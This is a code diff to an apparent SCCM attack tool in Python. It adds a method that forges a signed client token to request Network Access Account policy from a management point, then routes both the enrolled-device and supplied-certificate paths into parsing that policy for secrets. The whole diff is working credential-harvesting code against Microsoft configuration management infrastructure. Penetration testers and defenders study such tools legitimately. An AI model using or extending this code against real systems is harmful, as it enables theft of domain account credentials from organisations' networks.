@@ -246,8 +246,6 @@ class SCCMTools():
 
     def sendPolicyRequest(self, name, fqname, uuid, targetName, targetFQDN, targetUUID):
         body = Tools.encode_unicode(policyBody.format(clientid=targetUUID, clientfqdn=targetFQDN, client=targetName)) + b"\x00\x00\r\n"
-        payloadCompressed = zlib.compress(body)
-
         bodyCompressed = zlib.compress(body)
         public_key = CryptoTools.buildMSPublicKeyBlob(self.key)
         clientID = f"GUID:{uuid.upper()}"
@@ -273,6 +271,25 @@ class SCCMTools():
         #r = re.findall("http://<mp>(/SMS_MP/.sms_pol?[^\]]+)", deflatedData)
         return [result.group(1)]
     
+    def sendPolicyRequestCert(self):
+        clientToken = "{{{}}};{}".format(self.client_guid.upper(), now.strftime(dateFormat1))
+        clientTokenSignature = CryptoTools.signNoHash(self.key, Tools.encode_unicode(clientToken) + "\x00\x00".encode('ascii')).hex().upper()
+        bodyMsgPart = """<Msg ReplyCompression="none"><ID/><SourceID>{client_guid}</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[ClientToken:{clientToken}\r\nClientTokenSignature:{clientTokenSignature}\r\n]]></Property></Hook2></Hooks><Payload Type="inline"/><TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>"""
+        bodyMsgPart = bodyMsgPart.format(
+            client_guid=self.client_guid,
+            clientToken=clientToken,
+            clientTokenSignature=clientTokenSignature
+            )
+        siteCode = "PS1"
+        bodyMsgRemainder = """<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC"><PolicySource>SMS:""" + siteCode + """</PolicySource><ServerCookie/><Resource ResourceType="Machine"/><Identification><Machine><ClientID>""" + self.client_guid + "</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>" 
+        bodyMsgRemainder = Tools.encode_unicode(bodyMsgRemainder) + b"\x00\x00\r\n"
+        data = """--aAbBcCdDv1234567890VxXyYzZ\r\nContent-Disposition: form-data; name="Msg"\r\nContent-Type: text/plain; charset=UTF-16\r\n\r\n""".encode('ascii') + bodyMsgPart.encode('utf-16') + """\r\n--aAbBcCdDv1234567890VxXyYzZ\r\nContent-Disposition: form-data; name="RequestAssignments"\r\n\r\n""".encode('ascii') + bodyMsgRemainder + "--aAbBcCdDv1234567890VxXyYzZ--\r\n".encode('ascii')
+
+        deflatedData = self.sendCCMPostRequest(data)
+        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
+        #r = re.findall("http://<mp>(/SMS_MP/.sms_pol?[^\]]+)", deflatedData)
+        return [result.group(1)]
+       
 
     def parseEncryptedPolicy(self, result):
         # Man.. asn1 suxx!
@@ -390,15 +407,18 @@ class SCCMTools():
             # If too quick, SCCM requests fail (DB error, jank!)
             logger.info(f"[*] Waiting 10 seconds for database to update.")
             time.sleep(10)
+
+            logger.debug("[*] Requesting NAAPolicy.. 2 secs")
+            urls = self.sendPolicyRequest(self.device_name, self.device_fqdn, uuid, self.device_name, self.device_fqdn, uuid)
         
         else:
             logger.debug("[*] Using supplied certificate")
             self.prepareCertificate()
-
             uuid = self.client_guid.upper()
 
-        logger.debug("[*] Requesting NAAPolicy.. 2 secs")
-        urls = self.sendPolicyRequest(self.device_name, self.device_fqdn, uuid, self.device_name, self.device_fqdn, uuid)
+            logger.debug("[*] Requesting NAAPolicy.. 2 secs")
+            urls = self.sendPolicyRequestCert()
+
 
         logger.debug("[*] Parsing for Secretz...")
 
